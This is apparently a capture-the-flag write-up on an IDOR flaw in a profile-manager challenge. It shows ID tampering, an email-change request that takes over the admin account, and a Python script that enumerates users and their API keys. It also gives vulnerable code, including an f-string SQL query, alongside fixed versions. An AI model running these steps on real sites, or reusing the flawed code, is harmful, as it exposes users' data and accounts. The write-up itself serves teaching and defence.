---
layout: post
title: "IDOR - Insecure Direct Object Reference"
date: 2026-01-01
category: web
tags: [idor, access-control, authorization]
---

Exploiting Insecure Direct Object Reference to access other users' sensitive data and administrative functions.

## Challenge Overview

**Challenge Name:** User Profile Manager  
**Difficulty:** Easy  
**Points:** 150  
**Category:** Web Exploitation

A user management system where users can view and edit their own profiles, but lacks proper authorization checks.

## Enumeration / Recon

After creating an account and logging in (user ID: 1337), I observed the profile URL:

```
https://challenge.com/profile?id=1337
```

Profile page shows:
- Username
- Email
- Account creation date
- "Edit Profile" button

Clicking "Edit Profile" navigates to:
```
https://challenge.com/profile/edit?id=1337
```

The use of user ID in URL parameters immediately suggests potential IDOR vulnerability.

## Vulnerability Analysis / Findings

### Testing for IDOR

Changed URL parameter to different user IDs:

```
GET /profile?id=1
```

Successfully retrieved admin user's profile! The application:
1. Uses predictable sequential IDs
2. No authorization check before displaying data
3. User can access any profile by changing ID parameter
4. Edit functionality also vulnerable

### Escalation Testing

Tested editing other users' profiles:

```
POST /profile/edit
id=1&username=admin&email=newemail@test.com
```

Successfully modified admin's email address - full account takeover possible!

### API Endpoint Discovery

Found API endpoint that's also vulnerable:

```
GET /api/user/1
```

Returns JSON with more detailed information:
```json
{
  "id": 1,
  "username": "admin",
  "email": "admin@challenge.com",
  "role": "administrator",
  "api_key": "secret_key_here",
  "created_at": "2025-01-01"
}
```

## Exploitation / Solution

### Step 1: Enumerate users

Wrote a simple script to enumerate all users:

```python
import requests

session = requests.Session()
# Login first
session.post('https://challenge.com/login', data={'user': 'myuser', 'pass': 'mypass'})

# Enumerate users
for user_id in range(1, 100):
    r = session.get(f'https://challenge.com/api/user/{user_id}')
    if r.status_code == 200:
        data = r.json()
        print(f"[+] User {user_id}: {data['username']} ({data['role']})")
```

Found users:
- ID 1: admin (administrator)
- ID 2: moderator (moderator)  
- ID 1337: myuser (user)

### Step 2: Access admin profile

```
GET /profile?id=1
```

Retrieved admin's full profile information.

### Step 3: Access flag

Admin profile contained a "Secret Documents" section with the flag:

```
Flag{1d0r_n0_4uth_ch3ck_pwn3d}
```

Alternative: Using the API key from admin's JSON response to access `/admin/flag` endpoint.

## Flag

```
Flag{1d0r_n0_4uth_ch3ck_pwn3d}
```

## Lessons Learned

1. **Authorization checks** - Always verify user has permission to access requested resources
2. **Indirect references** - Use non-sequential, unpredictable identifiers (UUIDs)
3. **Session validation** - Verify resource belongs to authenticated user
4. **Access control lists** - Implement proper ACL for all sensitive operations
5. **Security by default** - Deny access unless explicitly granted

### Vulnerable Code

```python
@app.route('/profile')
def profile():
    user_id = request.args.get('id')
    user = db.query(f"SELECT * FROM users WHERE id={user_id}")
    return render_template('profile.html', user=user)
```

### Secure Implementation

```python
@app.route('/profile')
@login_required
def profile():
    requested_id = request.args.get('id')
    current_user_id = session.get('user_id')
    
    # Only allow users to view their own profile
    # or admins to view any profile
    if requested_id != current_user_id and not is_admin(current_user_id):
        abort(403, "Unauthorized access")
    
    user = db.query("SELECT * FROM users WHERE id=?", (requested_id,))
    
    if not user:
        abort(404)
    
    return render_template('profile.html', user=user)
```

### Better approach - Remove IDs from URLs:

```python
@app.route('/profile')
@login_required
def profile():
    # Get user from session, not from URL parameter
    user_id = session.get('user_id')
    user = db.query("SELECT * FROM users WHERE id=?", (user_id,))
    return render_template('profile.html', user=user)

# For admins viewing other profiles
@app.route('/admin/user/<uuid:user_uuid>')
@admin_required
def admin_view_user(user_uuid):
    user = db.query("SELECT * FROM users WHERE uuid=?", (user_uuid,))
    return render_template('profile.html', user=user)
```
